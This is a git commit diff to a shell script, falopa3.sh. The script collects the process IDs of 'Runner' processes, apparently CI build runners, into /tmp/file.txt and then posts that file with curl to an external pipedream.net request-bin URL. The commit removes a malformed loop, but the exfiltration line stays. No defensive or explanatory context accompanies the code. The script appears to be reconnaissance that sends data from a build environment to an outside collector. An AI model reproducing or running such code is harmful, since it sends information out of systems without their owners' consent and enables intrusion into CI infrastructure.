937db4e69beb6aae163a55ef9db4fab23d1f3abb
_m <matiasesena@gmail.com>
2021-11-05 16:58:19 -0300

    Update falopa3.sh

--- falopa3.sh
+++ falopa3.sh
@@ -4,12 +4,6 @@ echo "--- START ---" > /tmp/file.txt
 
 echo $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2) >> /tmp/file.txt
 
-for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
-do
-    echo "---$pid---" >> /tmp/file.txt;
-    done
-done
-
 echo "--- FINISH ---" >> /tmp/file.txt
 curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net
 
